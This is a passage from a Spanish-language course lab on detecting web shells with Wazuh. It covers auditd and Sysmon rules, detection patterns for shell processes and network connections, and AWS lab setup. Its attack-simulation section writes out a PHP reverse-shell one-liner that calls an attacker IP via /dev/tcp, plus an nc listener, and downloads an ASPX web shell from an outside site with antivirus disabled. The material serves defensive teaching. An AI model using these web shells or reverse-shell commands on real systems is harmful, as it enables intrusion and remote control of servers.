 $ sudo systemctl restart wazuh-manager</code></p>
</li>
</ol>
<h5 id="explicacion-de-las-reglas-personalizadas">Explicaci√≥n de las reglas personalizadas</h5>
<ul>
<li>
<p><code>id="100500"</code>: ID √∫nico de esta regla.</p>
</li>
<li>
<p><code>level="12"</code>: Severidad alta. El m√°ximo es 15.</p>
</li>
<li>
<p><code>&lt;if_sid&gt;554&lt;/if_sid&gt;</code>: Solo se aplica si antes se ha activado la regla con ID 554 (esta regla base detecta creaci√≥n de archivos).</p>
</li>
<li>
<p><code>&lt;field name="file" type="pcre2"&gt;...</code>: Aplica un regex (compatible con PCRE2) sobre el campo file. Busca archivos con extensiones t√≠picas de web shells:</p>
<p><code>.php, .asp, .jsp, .cshtml, .vbhtml, etc.</code></p>
</li>
<li>
<p><code>$(file)</code>: Variable que se sustituye con el nombre del archivo real.</p>
</li>
<li>
<p><code>&lt;mitre&gt;</code>: Indica t√©cnicas MITRE ATT&amp;CK asociadas:</p>
<ul>
<li><em>T1105 ‚Äì Ingress Tool Transfer: transferencia de herramientas maliciosas al sistema.</em></li>
<li><em>T1505 ‚Äì Server Software Component: modificaci√≥n maliciosa de componentes del servidor (como web shells).</em></li>
</ul>
</li>
</ul>
<p>üìå Esta regla detecta que se ha creado un archivo sospechoso que podr√≠a ser un web shell.</p>
<p>La segunda regla es similar, s√≥lo que intenta detectar la <strong>modificaci√≥n</strong> y no la creaci√≥n de archivos.</p>
<p>La tercera regla intenta detectar modificaciones de archivo, es decir que se haya disparado la segunda regla, y que √©stas adem√°s incluyan funciontes t√≠picas de webshells.</p>
<h3 id="usando-reglas-personalizadas-para-detectar-indicios-de-web-shells">Usando reglas personalizadas para detectar indicios de web shells</h3>
<p>Wazuh permite escribir reglas personalizadas que disparan alertas cuando se detectan determinadas caracter√≠sticas en logs. Adem√°s integraremos Wazuh con <strong>auditd</strong> en endpoints Linux y <strong>Sysmon</strong> en Windows para enriquecer los fuentes de logs, para as√≠ mejorar la seguridad.</p>
<h4 id="ubuntu">Ubuntu</h4>
<p><strong>Auditd</strong> (de Linux Audit Daemon) es una utilidad que recopila y almacena eventos del sistema tales como llamadas al sistema (<em>syscall</em>) y funciones. Usando auditd podemos monitorizar comandos del sistema as√≠ como conexiones de red que lleve a cabo un usuario de servidor web, escribiendo reglas que generen una alerta cuando esto ocurra.</p>
<p>As√≠ las cosas:</p>
<ol>
<li>
<p>Actualizar los paquetes de los respositorios e instalar <strong>auditd</strong>:</p>
<p><code>console 
$ sudo apt update
$ sudo apt install auditd</code></p>
</li>
<li>
<p>Enviar los logs de <em>auditd</em> al servidor de Wazuh para su an√°lisis, a√±adiendo para ello la siguiente configuraci√≥n al agente de Wazuh en el archivo <code>/var/ossec/etc/ossec.conf</code>:</p>
<p><code>xml
&lt;ossec_config&gt;
&lt;localfile&gt;
    &lt;location&gt;/var/log/audit/audit.log&lt;/location&gt;
    &lt;log_format&gt;audit&lt;/log_format&gt;
&lt;/localfile&gt;
&lt;/ossec_config&gt;</code></p>
</li>
<li>
<p>Obtener el identificador dle usuario del servidor web Apache ejecutando el siguiente comando:</p>
<p><code>console
$ sudo apachectl -S</code></p>
<p>???note "Salida"</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span></pre></div></td><td class="code"><div><pre><span></span><code>```sh hl_lines=&quot;12&quot;
VirtualHost configuration:
*:80                   127.0.1.1 (/etc/apache2/sites-enabled/000-default.conf:1)
ServerRoot: &quot;/etc/apache2&quot;
Main DocumentRoot: &quot;/var/www/html&quot;
Main ErrorLog: &quot;/var/log/apache2/error.log&quot;
Mutex mpm-accept: using_defaults
Mutex watchdog-callback: using_defaults
Mutex default: dir=&quot;/var/run/apache2/&quot; mechanism=default 
PidFile: &quot;/var/run/apache2/apache2.pid&quot;
Define: DUMP_VHOSTS
Define: DUMP_RUN_CFG
User: name=&quot;www-data&quot; id=33
Group: name=&quot;www-data&quot; id=33
```
</code></pre></div></td></tr></table></div>
</li>
<li>
<p>A√±adir al archivo de configuraci√≥n de <em>auditd</em> <code>/etc/audit/rules.d/audit.rules</code>, usando el id de usuario en el paso 3, lo siguiente:</p>
<p>```sh</p>
<h2 id="auditd-rules-that-detect-command-execution-from-user-www-data">Auditd rules that detect command execution from user www-data.</h2>
<p>-a always,exit -F arch=b32 -S execve -F uid=<USER_ID> -F key=webshell_command_exec
-a always,exit -F arch=b64 -S execve -F uid=<USER_ID> -F key=webshell_command_exec</p>
<h2 id="auditd-rules-that-detect-network-connections-from-user-www-data">Auditd rules that detect network connections from user www-data.</h2>
<p>-a always,exit -F arch=b64 -S socket -F a0=10 -F euid=<USER_ID> -k webshell_net_connect
-a always,exit -F arch=b64 -S socket -F a0=2 -F euid=<USER_ID> -k webshell_net_connect
-a always,exit -F arch=b32 -S socket -F a0=10 -F euid=<USER_ID> -k webshell_net_connect
-a always,exit -F arch=b32 -S socket -F a0=2 -F euid=<USER_ID> -k webshell_net_connect
```</p>
</li>
<li>
<p>Reiniciar <em>auditd</em> y el agente de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
</li>
</ol>
<pre><code class="language-console">$ sudo systemctl restart auditd
$ sudo systemctl restart wazuh-agent
</code></pre>
<h4 id="windows">Windows</h4>
<p>System Monitor (Sysmon) es un servicio de sistema de Windows que monitoriza y registra la actividad del sistema en los logs de eventos de Windows.</p>
<p>Complementa los logs con informaci√≥n detallada sobre la creaci√≥n de procesos o conexiones de red, entre otros. Por ejemplo, Sysmon puede monitorizar el proceso <code>w3wp.exe,</code>componente fundamental del servidor web de Microsoft Internet Information Services (IIS). Este proceso se encarga de manejar las solicitudes HTTP recibidas por el servidor web y de procesarlas para generar las respuestas correspondientes.</p>
<p>IIS tiene una funcionalidad de seguridad llamada <em>application pool</em> que permite que un pool de aplicaciones se ejecuten √∫nicamente con una √∫nica cuenta, cuyo nombre por defecto es <code>DefaultAppTool</code>. </p>
<p>Con esta cuenta, el proceso de IIS corre exclusivamente con privilegios de usuario. Los atacantes suelen aprovechar este proceso para abrir terminales de <strong>PowerShell</strong> o <strong>cmd</strong>. </p>
<p>Explicado lo anterior, para configurar Sysmon y que Wazuh procese sus logs, haremos:</p>
<ol>
<li>
<p>Descargar en nuestra m√°quina Windows el instalador de <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> y el <a href="https://wazuh.com/resources/blog/emulation-of-attack-techniques-and-detection-with-wazuh/sysmonconfig.xml">archivo de configuraci√≥n que necesitamos</a></p>
</li>
<li>
<p>Instalar Sysmon, usando la configuraci√≥n descargada, mediante un terminal de PowerShell corriendo con privilegios de administrador:</p>
</li>
</ol>
<pre><code class="language-console">&gt; .\Sysmon64.exe -accepteula -i sysmonconfig.xml
</code></pre>
<ol>
<li>A√±adir las siguientes l√≠neas de configuraci√≥n al archivo <code>C:\Program Files (x86)\ossec-agent\ossec.conf</code>, encargado de la captura y redireci√≥n de logs de Sysmon hacia el servidor de Wazuh:</li>
</ol>
<pre><code class="language-xml">&lt;ossec_config&gt;
  &lt;localfile&gt;
    &lt;location&gt;Microsoft-Windows-Sysmon/Operational&lt;/location&gt;
    &lt;log_format&gt;eventchannel&lt;/log_format&gt;
  &lt;/localfile&gt;
&lt;/ossec_config&gt;
</code></pre>
<ol>
<li>
<p>Reiniciar el agente de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
<p>```powershell</p>
<blockquote>
<p>Restart-Service -Name wazuh
```</p>
</blockquote>
</li>
</ol>
<h4 id="amazon-linux-2-wazuh-server">Amazon Linux 2 (Wazuh server)</h4>
<ol>
<li>
<p>A√±adir al archivo de configuraci√≥n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intenta detectar comandos ejecutados por una web shell, as√≠ como conexiones de red establecidas:</p>
<p>???note "reglas_webshell.xml"
    ```xml
    <!-- Reglas Linux. -->
    <group name="auditd, linux, webshell,">
    <!-- Eta regla detecta comandos ejecutados por una web shell -->
    <rule id="100520" level="12">
        <if_sid>80700</if_sid>
        <field name="audit.key">webshell_command_exec</field>
        <description>[Command execution ($(audit.exe))]: Possible web shell attack detected</description>
        <mitre>
        <id>T1505.003</id>
        <id>T1059.004</id>
        </mitre>
    </rule>
    <!-- Esta regla detecta conexiones de red realizadas por una web shell -->
    <rule id="100521" level="12">
        <if_sid>80700</if_sid>
        <field name="audit.key">webshell_net_connect</field>
        <description>[Network connection via $(audit.exe)]: Possible web shell attack detected</description>
        <mitre>
        <id>TA0011</id>
        <id>T1049</id>
        <id>T1505.003</id>
        </mitre>
    </rule>
    </group></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span>
<span class="normal">21</span>
<span class="normal">22</span>
<span class="normal">23</span>
<span class="normal">24</span>
<span class="normal">25</span>
<span class="normal">26</span>
<span class="normal">27</span>
<span class="normal">28</span></pre></div></td><td class="code"><div><pre><span></span><code>&lt;!-- Reglas Windows --&gt;
&lt;group name=&quot;sysmon, webshell, windows,&quot;&gt;
&lt;!-- Esta regla detecta comandos ejecutados por una web shell  --&gt;
&lt;rule id=&quot;100530&quot; level=&quot;12&quot;&gt;
    &lt;if_sid&gt;61603&lt;/if_sid&gt;
    &lt;field name=&quot;win.eventdata.parentImage&quot; type=&quot;pcre2&quot;&gt;(?i)w3wp\.exe&lt;/field&gt;
    &lt;field name=&quot;win.eventdata.parentUser&quot; type=&quot;pcre2&quot;&gt;(?i)IIS\sAPPPOOL\\\\DefaultAppPool&lt;/field&gt;
    &lt;description&gt;[Command execution ($(win.eventdata.commandLine))]: Possible web shell attack detected&lt;/description&gt;
    &lt;mitre&gt;
    &lt;id&gt;T1505.003&lt;/id&gt;
    &lt;id&gt;T1059.004&lt;/id&gt;
    &lt;/mitre&gt;
&lt;/rule&gt;

&lt;!-- Esta regla detecta conexiones de red realizadas por una web shell --&gt;
&lt;rule id=&quot;100531&quot; level=&quot;12&quot;&gt;
    &lt;if_sid&gt;61605&lt;/if_sid&gt;
    &lt;field name=&quot;win.eventdata.image&quot; type=&quot;pcre2&quot;&gt;(?i)w3wp\.exe&lt;/field&gt;
    &lt;field name=&quot;win.eventdata.user&quot; type=&quot;pcre2&quot;&gt;(?i)IIS\sAPPPOOL\\\\DefaultAppPool&lt;/field&gt;
    &lt;description&gt;[Network connection]: Possible web shell attempting network connection on source port: $(win.eventdata.sourcePort) and destination port: $(win.eventdata.destinationPort)&lt;/description&gt;
    &lt;mitre&gt;
    &lt;id&gt;TA0011&lt;/id&gt;
    &lt;id&gt;T1049&lt;/id&gt;
    &lt;id&gt;T1505.003&lt;/id&gt;
    &lt;/mitre&gt;
&lt;/rule&gt;
&lt;/group&gt;
```
</code></pre></div></td></tr></table></div>
</li>
<li>
<p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
<p><code>console
$ sudo systemctl restart wazuh-manager</code></p>
</li>
</ol>
<h3 id="usando-monitorizacion-de-comandos-para-detectar-las-conexiones-de-red-de-un-posible-ataque">Usando monitorizaci√≥n de comandos para detectar las conexiones de red de un posible ataque</h3>
<p>En esta secci√≥n usaremos la monitorizaci√≥n de comandos para complementar el uso de <em>auditd</em> en el endpoint Linux. Nos servir√° para obtener informaci√≥n adicional sobre las direcciones IP/puertos desde los que se originan los ataques.</p>
<h4 id="ubuntu_1">Ubuntu</h4>
<ol>
<li>
<p>A√±adir las siguientes configuraciones al archivo de configuraci√≥n del agente Wazuh <code>/var/ossec/etc/ossec.conf</code>. Esto determina el comando que se ejecutar√° en el endpoint:</p>
<p><code>xml
&lt;ossec_config&gt;
&lt;localfile&gt;
    &lt;log_format&gt;full_command&lt;/log_format&gt;
    &lt;command&gt;ss -nputw | egrep '"sh"|"bash"|"csh"|"ksh"|"zsh"' | awk '{ print $5 "|" $6 }'&lt;/command&gt;
    &lt;alias&gt;webshell connections&lt;/alias&gt;
    &lt;frequency&gt;120&lt;/frequency&gt;
&lt;/localfile&gt;
&lt;/ossec_config&gt;</code>
Como vemos, este comando se ejecuta cada 120 segundos con el fin de detectar conexiones activas abiertas por shells como <code>bash</code>, <code>zsh</code>, etc.</p>
</li>
<li>
<p>Reiniciar el agente de Wazuh par aplicar los cambios de configuraci√≥n:</p>
<p><code>console
$ sudo systemctl restart wazuh-agent</code></p>
</li>
</ol>
<h4 id="amazon-linux-2-wazuh-server_1">Amazon Linux 2 (Wazuh server)</h4>
<ol>
<li>
<p>A√±adir, en el archivo de configuraci√≥n <code>/var/ossec/etc/decoders/local_decoder.xml</code> los siguientes decodificadores para decodificar patrones de conexiones de red establecidas por web shells en los servidores web:</p>
<p><code>xml
&lt;!-- Decodificar para las conexiones de red de web shells --&gt;
&lt;decoder name="network-traffic-child"&gt;
  &lt;parent&gt;ossec&lt;/parent&gt;
  &lt;prematch offset="after_parent"&gt;^output: 'webshell connections':&lt;/prematch&gt;
  &lt;regex offset="after_prematch" type="pcre2"&gt;(\d+.\d+.\d+.\d+):(\d+)\|(\d+.\d+.\d+.\d+):(\d+)&lt;/regex&gt;
  &lt;order&gt;local_ip, local_port, foreign_ip, foreign_port&lt;/order&gt;
&lt;/decoder&gt;</code></p>
</li>
<li>
<p>A√±adir al archivo de configuraci√≥n <code>/var/ossec/etc/rules/reglas_webshell.xml</code>, las siguientes reglas que intentna detectar conexiones de red establecidas por web shells en los servidores web:</p>
<p><code>xml 
&lt;!-- Regla detectar conexiones red web shells --&gt;
&lt;group name="linux, webshell,"&gt;
  &lt;rule id="100510" level="12"&gt;
    &lt;decoded_as&gt;ossec&lt;/decoded_as&gt;
    &lt;match&gt;ossec: output: 'webshell connections'&lt;/match&gt;
    &lt;description&gt;[Network connection]: Script attempting network connection on source port: $(local_port) and destination port: $(foreign_port)&lt;/description&gt;
    &lt;mitre&gt;
      &lt;id&gt;TA0011&lt;/id&gt;
      &lt;id&gt;T1049&lt;/id&gt;
      &lt;id&gt;T1505.003&lt;/id&gt;
   &lt;/mitre&gt;
  &lt;/rule&gt;
&lt;/group&gt;</code></p>
</li>
<li>
<p>Reiniciar el manager de Wazuh para aplicar los cambios en la configuraci√≥n:</p>
<p><code>console
$ sudo systemctl restart wazuh-manager</code></p>
</li>
</ol>
<h2 id="simulacion-de-ataque">Simulaci√≥n de ataque</h2>
<p>A continuaci√≥n se detallan los pasos para simular como funcionan las web shells en los endpoints comprometidos.</p>
<h3 id="pasos-para-simular-el-ataque-contra-el-endpoint-ubuntu">Pasos para simular el ataque contra el endpoint Ubuntu</h3>
<h4 id="ubuntu_2">Ubuntu</h4>
<p>Ejecutar los siguientes pasos con privilegio de <em>root</em>.</p>
<ol>
<li>
<p>Crear un archivo, por ejemplo <code>webshell.php</code> en el directorio del servidor web <code>/var/www/html</code> con la siguiente l√≠nea de c√≥digo que ejecutar√° una shell inversa:</p>
<p><code>php
echo -e "&lt;?php exec('/bin/bash -c \"bash -i &gt;&amp; /dev/tcp/&lt;IP_DEBIAN&gt;/4444 0&gt;&amp;1\"');?&gt;" &gt; /var/www/html/webshell.php</code></p>
</li>
</ol>
<h4 id="debian">Debian</h4>
<ol>
<li>
<p>En el terminal de nuestra Debian utilizaremos netcat (nc, instaladlo si no lo est√°) para escuchar conexiones en el puerto <strong>4444</strong>:</p>
<p><code>bash
$ nc -nlvp 4444</code></p>
</li>
<li>
<p>Ejecutar la web shell desde nuestro navegador accediendo a la URL <code>http://&lt;IP_UBUNTU&gt;/webshell.php</code>, de tal forma que se establezca una shell inversa con el endpoint Ubuntu hacia nuestra Debian atacante.</p>
</li>
<li>
<p>En el terminal que nos aparecer√° en el netcat de nuestra Debian, ejecutar varios comandos tales como <code>id</code>, <code>cat /etc/passwd</code>, <code>whoami</code>...</p>
</li>
</ol>
<h4 id="ver-las-alertas">Ver las alertas</h4>
<p>En el dashboard de Wazuh, navegar a <strong><em>Security events</em></strong> y visualizar las alertas generadas:</p>
<h3 id="pasos-para-simular-el-ataque-contra-el-endpoint-windows">Pasos para simular el ataque contra el endpoint Windows</h3>
<h4 id="windows_1">Windows</h4>
<p>!!!warning "Atenci√≥n"
    Es m√°s que probable que necesit√©is desactivar el antivirus y la detecci√≥n de amenazas de Windows para que os funcione esta parte.</p>
<p>Ejecutar los siguientes pasos en una terminal de PowerShell ejecut√°ndose como administrador:</p>
<ol>
<li>
<p>Descargar una copia de una web shell en el directorio del servidor web <code>C:\inetput\wwwroot</code> y llamarla, por ejemplo, <code>webshell.aspx</code>:</p>
<p>```powershell</p>
<blockquote>
<p>Invoke-WebRequest -OutFile 'C:\Users\Public\Downloads\webshell.aspx' -Uri https://privdayz.com/cdn/txt/aspx.txt
copy 'C:\Users\Public\Downloads\webshell.aspx' 'C:\inetpub\wwwroot\webshell.aspx'
```</p>
</blockquote>
</li>
</ol>
<h4 id="debian_1">Debian</h4>
<ol>
<li>
<p>En el terminal de nuestra Debian escuchamos conexiones en el puerto <strong>4444</strong>:</p>
<p><code>bash
$ nc -nlvp 4444</code></p>
</li>
<li>
<p>Acceder a la web shell desde nuestro navegador mediante la URL <code>http://&lt;IP_WINDOWS&gt;/webshell.aspx</code>.</p>
<p>La contrase√±a de la web shell es <strong>admin</strong>. En el men√∫ <em>CmdShell</em>, ejecuta comandos tales como <code>whoami</code>, <code>ipconfig</code>...</p>
</li>
<li>
<p>En el men√∫ <em>PortMap</em>, introducir la IP de nuestra Debian como <strong>Remote IP</strong>, <code>4444</code> como <strong>Remote Port</strong> y <code>5555</code> como <strong>Local Port</strong>. Tras ello, pulsar <strong>MapPort</strong></p>
</li>
</ol>
<h4 id="ver-las-alertas_1">Ver las alertas</h4>
<p>En el dashboard de Wazuh, navegar a <strong><em>Security events</em></strong> y visualizar las alertas generadas:</p>
<h2 id="recapitulacion-y-conclusiones">Recapitulaci√≥n y conclusiones</h2>
<ul>
<li>
<p>Las web shells de cualquier tipo suelen tener comportamientos similares, esto es, crean o modifican archivos presentes en los directorios de los servidores web, realizando conexiones de red para establecer shells inversas y ejecutando comandos para tareas post-explotaci√≥n.</p>
</li>
<li>
<p>Con Wazuh podemos ser capaces de detectar estas web shells, usando FIM y la monitorizaci√≥n de comandos</p>
</li>
<li>
<p>Tambi√©n hemos realizado la integraci√≥n de <em>auditd</em> y <em>Sysmon</em> con Wazuh, aportando as√≠ m√°s informaci√≥n a los logs, siendo capaces de realizar una mejor detecci√≥n en los endpoints comprometidos</p>
</li>
<li>
<p>No obstante, es recomendable que las organizaciones adem√°s tengan en marcha defensas contra las tareas de post-explotaci√≥n como puedan ser el escaneo y parcheo de sistemas y aplicaciones vulnerables, as√≠ como pol√≠ticas de seguridad que monitoricen malas configuraciones de los sistemas.</p>
</li>
</ul>
<h2 id="anexo-despliegue-de-instancias-ec2-linux-y-windows-en-aws">Anexo: despliegue de instancias EC2 Linux y Windows en AWS</h2>
<p>Una vez tenemos creados nuestro laboratorio (<em>Learner Lab</em>)en AWS Academy, podremos hacer uso de varios servicios de Amazon Web Services, dentro de unos l√≠mites, aunque estos l√≠mites no nos afectan para nuestro prop√≥sito.</p>
<p>Amazon ofrece una cantidad ingente de servicios que pod√©is consultar en los cap√≠tulos 1, 3 y 9 del curso de AWS Foundations. Uno de estos servicios es el de computaci√≥n, es decir, la creaci√≥n de instancias EC2 (Elastic Compute Cloud). Esto no es m√°s que la creaci√≥n de m√°quinas virtuales en la nube, lo cual nos es de extrema utilidad para el caso que nos ocupa.</p>
<p>A continuaci√≥n se mostrar√° detalladamente el proceso de creaci√≥n de instancias Linux y Windows, as√≠ como la forma de conectarse a dichas instancias.</p>
<h3 id="ec2-linux">EC2 Linux</h3>
<p>En primer lugar deb√©is entrar en vuestro Learner Lab y acceder a los contenidos:</p>
<p><img alt="" src="../img/aws1.png" /></p>
<p>E ir a la pantalla de lanzamiento del laboratorio:</p>
<p><img alt="" src="../img/aws2.png" /></p>
<p>Le daremos a iniciar laboratorio y esperaremos a que el icono marcado se ponga en verde. Una vez lo est√©, haremos click en √©l para que nos lleve a la p√°gina de administraci√≥n de servicios de AWS:</p>
<p><img alt="" src="../img/aws3.png" /></p>
<p>Una vez en esta p√°gina, el servicio que a nosotros nos interesa en este momento son las instancias EC2. As√≠ pues, escribimos esto en la caja de b√∫squeda:</p>
<p><img alt="" src="../img/aws4.png" /></p>
<p>Le decimos que queremos lanzar una nueva instancia:</p>
<p><img alt="" src="../img/aws5.png" /></p>
<p>E iremos completando los detalles necesarios, como nombre o imagen de la m√°quina que se crear√° (Amazon Linux, Ubuntu, Debian, Windows...). En esta caso se ilustra el ejemplo de la m√°quina cliente Ubuntu pero habr√≠a que seleccionar seg√∫n el caso:</p>
<p><img alt="" src="../img/aws6.png" /></p>
<p>Podemos elegir distintos tipos de instancias, con distintos precios por uso, as√≠ como propiedades (CPU+RAM). <strong>Para el caso de las instancias Linux, nos basta una <em>t2.micro</em>. Para el caso de las Windows, debemos elegir t2.medium para no quedarnos demasiado cortos.</strong></p>
<p><img alt="" src="../img/aws7.png" /></p>
<p>En el apartado de <em>Claves de sesi√≥n</em>, elegiremos <strong>vockey</strong>. Esto nos permitir√° m√°s tarde conectarnos a las instancias:</p>
<p><img alt="" src="../img/aws8.png" /></p>
<p>En configuraciones de red lo √∫nico que debemos hacer es dejar marcada la opci√≥n por defecto <strong><em>Crear grupo de seguridad</em></strong> y marcarle que permita tanto el tr√°fico SSH desde cualquier lugar, como el tr√°fico HTTP desde Internet.</p>
<p>Los grupos de seguridad son, de forma aproximada, una especie de Firewall que filtra las conexiones desde y hacia nuestras instancias.</p>
<p>!!!warning "¬°Atenci√≥n!"
    Los clientes Linux y Windows que contendr√°n sendos agentes, alojan su contenido mediante servidores web en el puerto (80), HTTP. Sin embargo, el servidor de Wazuh o Wazuh manager, utiliza s√≥lo HTTPS con certificado autofirmado para su interfaz web. </p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>Tened esto en cuenta a la hora de crear la instancia y marcad la casilla correspondiente.

Si os despist√°is, m√°s adelante se explica c√≥mo modificar grupos de seguridad.
</code></pre></div></td></tr></table></div>
<p>Tras lanzar la instancia, se encontrar√° en estado <em>Iniciando</em> y despu√©s pasar√° a <em>En ejecuci√≥n</em>.</p>
<h3 id="ec2-windows">EC2 Windows</h3>
<p>Lanzamos otra vez una nueva instancia, indicando el nombre que queramos y dici√©ndole que se tratar√° de un Windows:</p>
<p><img alt="" src="../img/aws9.png" /></p>
<p>Puesto que carecemos de la opci√≥n de un Windows 10/11, utilizaremos entonces un Windows Server como cliente.</p>
<p>Como se indic√≥ anteriormente, ha de ser <em>t2.medium</em>: </p>
<p><img alt="" src="../img/aws10.png" /></p>
<p>De nuevo, indicamos las claves <em>vockey</em> y permitimos tanto tr√°fico SSH, como HTTP:</p>
<p><img alt="" src="../img/aws11.png" /></p>
<p>Tras lanzar la instancia, se encontrar√° en estado <em>Iniciando</em> y despu√©s pasar√° a <em>En ejecuci√≥n</em>.</p>
<h3 id="cuestiones-genericas">Cuestiones gen√©ricas</h3>
<h4 id="mas-reglas-en-los-grupos-de-seguridad">M√°s reglas en los grupos de seguridad</h4>
<p>Para el servidor de Wazuh y para la m√°quina atacante, vamos a modificar sus grupos de seguridad para que puedan comunicarse con cualquier m√°quina de la red sin problemas.</p>
<p>Marcamos la instancia que queramos modificar y seleccionamos la pesta√±a <em>Seguridad</em>:</p>
<p><img alt="" src="../img/aws12.png" /></p>
<p>Localizamos el grupo de seguridad y haremos click sobre √©l:</p>
<p><img alt="" src="../img/aws13.png" /></p>
<p>Una vez dentro del grupo, editamos las reglas <strong>de entrada</strong>:</p>
<p><img alt="" src="../img/aws14.png" /></p>
<p>Las instancias se crean por defecto en la red <code>172.31.0.0/16</code>. Permitiremos entonces todo el tr√°fico de entrada proveniente de dicha red, a√±adiendo una regla a tal efecto:</p>
<p><img alt="" src="../img/aws15.png" /></p>
<h4 id="conexion-remota-a-las-maquinas">Conexi√≥n remota a las m√°quinas</h4>
<h5 id="linux">Linux</h5>
<p>Accedemos a la pantalla primig√©nia desde donde lanzamos nuestro laboratorio y en la secci√≥n de <em>AWS Details</em> tendremos la posibilidad de descargarnos unas claves para la conexi√≥n que queremos llevar a cabo. As√≠ pues, las descargamos, tal y como indica el paso 2:</p>
<p><img alt="" src="../img/aws16.png" /></p>
<p>Es importante darle los permisos adecuados a la clave privada reci√©n descargada, de otra forma no nos permitir√° conectarnos. Una vez hecho, basta con realizar una conexi√≥n normal por SSH pero indicando con el par√°metro <code>-i</code>que utilizaremos el archivo de claves que nos desacargamos en el paso anterior:</p>
<p><img alt="" src="../img/aws17.png" /></p>
<p>La IP <strong>p√∫blica</strong> de cada instancia al a que queramos conectarnos podemos consultarla as√≠:</p>
<p><img alt="" src="../img/aws18.png" /></p>
<p>Y de esta forma ya podemos realizar cualquier acci√≥n que necesit√°semos llevar a cabo, tal y como si se tratase de una m√°quina virtual en nuestra m√°quina.</p>
<h5 id="windows_2">Windows</h5>
<p>Para el caso de Windows, en lugar de conectarnos usando SSH, lo haremos mediante escritorio remoto (RDP). Para ello el proceso es un poco distinto, ve√°moslo.</p>
<p>Igual que para el caso de Linux, necesitaremos la clave privada que nos podemos descargar. No obstante, la conexi√≥n se realizar√° utilizando alg√∫n cliente RDP. Si utiliz√°is Windows para conectaros, el cliente lo tendr√©is nativo. Si por otra parte utiliz√°is Linux, necesitar√©is alguna aplicaci√≥n tipo Remmina o similar.</p>
<p>El primer paso ser√° seleccionar nuestra instancia Windows y darle a <em>Conectar</em>:</p>
<p><img alt="" src="../img/aws19.png" /></p>
<p>En esta secci√≥n le diremos que nos vamos a conectar mediante un cliente RDP:</p>
<p><img alt="" src="../img/aws20.png" /></p>
<p>Nos descargaremos el archivo <em>.rdp</em> que utilizaremos para conectarnos y, tras ello, le daremos a <em>Obtener contrase√±a</em> para obtener las credenciales a utilizar:</p>
<p><img alt="" src="../img/aws21.png" /></p>
<p>Para poder obtener nuestra contrase√±a debemos hacer uso del archivo de clave privada que nos descargamos en seccines anteriores (es el mismo para todas las instancias).</p>
<p>Lo cargaremos y, una vez hecho, le daremos a descifrar contrase√±a:</p>
<p><img alt="" src="../img/aws22.png" /></p>
<p>Una vez obtenida la contrase√±a no queda m√°s que utilizar el cliente RDP elegido (en mi caso Remmina) para abrir el archivo <em>.rdp</em> y conectarnos utilizando la contrase√±a obtenida:</p>
<p><img alt="" src="../img/aws23.png" /></p>
<p><img alt="" src="../img/aws24.png" /></p>
<p><img alt="" src="../img/aws25.png" /></p>
<p><img alt="" src="../img/aws26.png" /></p>
<p><img alt="" src="../img/aws27.png" /></p>
<p>!!!warning "¬°Atenci√≥n!"
    El laboratorio se apaga autom√°ticamente a las 4 horas, tiempo m√°s que suficiente para llevar a cabo la pr√°ctica. En caso contrario, podr√©is reiniciarlo puesto que s√≥lo se apagan las instancias pero no se pierde el trabajo.</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>Si trabaj√°is en varias tandas o acab√°is antes de las 4 horas, apagadlo vosotros para evitar gastos innecearios en vuestro cr√©dito de 100$. Para ello, en la p√°gina de lanzamiento del laboratorio, esta vez le daremos a ***End lab***
</code></pre></div></td></tr></table></div>
<h2 id="despliegue-automatizado-del-escenario">Despliegue automatizado del escenario</h2>
<p>Para desplegar este escenario de forma automatizada en AWS se puede hacer uso del siguiente repositorio: </p>
<p><a href="https://github.com/raul-profesor/wazuh-webshells-terraform.git">https://github.com/raul-profesor/wazuh-webshells-terraform.git</a></p>







  
  






                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
  Volver al principio
</button>
        
      </main>
      
        <footer class="md-footer">
  
    
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
